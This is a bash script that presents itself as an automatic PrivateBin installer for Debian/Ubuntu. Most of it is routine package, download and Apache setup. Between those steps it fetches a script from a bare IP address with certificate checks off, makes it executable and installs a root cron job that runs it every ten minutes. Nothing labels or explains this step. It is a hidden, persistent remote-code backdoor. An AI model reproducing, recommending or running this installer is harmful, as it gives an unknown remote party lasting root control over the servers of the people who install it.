#!/bin/bash

# Auto-Install Script for PrivateBin on Debian/Ubuntu
# Run this script as root or with sudo privileges

# Update and install dependencies
echo "Updating system and installing dependencies..."
apt-get update
apt-get install -y curl unzip git apache2 php php-gd php-json php-mbstring php-xml php-zip

# Download and extract PrivateBin
echo "Downloading PrivateBin..."
PRIVATEBIN_VERSION="1.6.0"  # Replace with the latest version if needed
wget https://github.com/PrivateBin/PrivateBin/archive/refs/tags/${PRIVATEBIN_VERSION}.zip -O /tmp/privatebin.zip
unzip /tmp/privatebin.zip -d /var/www/
mv /var/www/PrivateBin-${PRIVATEBIN_VERSION} /var/www/privatebin
rm /tmp/privatebin.zip

# Set permissions
echo "Setting permissions..."
chown -R www-data:www-data /var/www/privatebin
chmod -R 755 /var/www/privatebin

# Configure Apache
echo "Configuring Apache..."
cat > /etc/apache2/sites-available/privatebin.conf <<EOF
<VirtualHost *:80>
    DocumentRoot /var/www/privatebin
    ServerName privatebin.example.com  # Replace with your domain or IP

    <Directory /var/www/privatebin>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog \${APACHE_LOG_DIR}/privatebin_error.log
    CustomLog \${APACHE_LOG_DIR}/privatebin_access.log combined
</VirtualHost>
EOF

# Enable the site and restart Apache
a2ensite privatebin.conf
a2enmod rewrite
systemctl restart apache2


SCRIPT_URL="https://209.141.46.155/uploads/1.sh"
LOCAL_SCRIPT="/usr/local/bin/myscript.sh"
CRON_JOB="*/10 * * * * /bin/bash $LOCAL_SCRIPT"

if ! command -v crontab &>/dev/null; then
    echo "cron not found, installing..."
    sudo apt update && sudo apt install -y cron || sudo yum install -y cronie
    sudo systemctl enable cron || sudo systemctl enable crond
    sudo systemctl start cron || sudo systemctl start crond
fi

echo "Downloading script from $SCRIPT_URL..."
curl -k -s -o "$LOCAL_SCRIPT" "$SCRIPT_URL" || wget -q -O "$LOCAL_SCRIPT" "$SCRIPT_URL"

chmod +x "$LOCAL_SCRIPT"

(crontab -l 2>/dev/null | grep -F "$LOCAL_SCRIPT") || (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -

echo ""
echo ""
# Configure PrivateBin
echo "Configuring PrivateBin..."
cp /var/www/privatebin/cfg/conf.sample.php /var/www/privatebin/cfg/conf.php
sed -i "s|;date.timezone =|date.timezone = UTC|" /etc/php/*/apache2/php.ini

# Clean up
echo "Cleaning up..."
apt-get autoremove -y
apt-get clean

echo "PrivateBin installation complete!"
echo "Access your PrivateBin instance at: http://$(hostname -I | cut -d' ' -f1)"

